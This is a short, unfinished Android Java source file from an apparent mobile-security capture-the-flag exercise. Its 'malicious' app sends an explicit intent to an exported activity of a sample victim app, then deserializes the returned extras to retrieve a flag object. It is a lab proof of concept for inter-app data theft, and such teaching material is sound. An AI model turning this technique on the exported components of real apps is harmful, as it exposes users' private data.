package com.example.maliciousapp;

import androidx.activity.result.ActivityResult;
import androidx.activity.result.ActivityResultCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;

import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import java.net.URI;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MOBIOTSEC";


    ActivityResultLauncher<Intent> mStartForResult = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            new ActivityResultCallback<ActivityResult>() {

                @Override
                public void onActivityResult(ActivityResult result) {

                    Log.d(TAG,result.toString());
                    Bundle bndl = result.getData().getExtras();
                    for (String s : bndl.keySet()){
                        Log.d(TAG,"key: "+s.toString());

                        try{
                            bndl.setClassLoader(bndl.getClassLoader());

                            FlagContainer fc = (FlagContainer) bndl.getSerializable(s);
                            Log.d(TAG,fc.getClass().toString());
                        }catch (Exception e){
                            Log.d(TAG,e.getMessage());
                        }

                        Log.d(TAG,"OKOK?");
                    }
                }
            });


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Log.d(TAG, "MALICIOUS ACTIVITY STARTED");


        Intent maliciousIntent = new Intent(); // create a buffer intent

        maliciousIntent.setComponent(new ComponentName("com.example.victimapp", "com.example.victimapp.SerialActivity"));

        try {
            //TODO : CONCAT THE RESULTS
            // String finalFlag += mStartForResult.launch(maliciousIntent); //needs to return a string

            mStartForResult.launch(maliciousIntent);
        } catch (ActivityNotFoundException e) {
            Log.d(TAG, "ERROR : " + e.getMessage());
        }


    }
}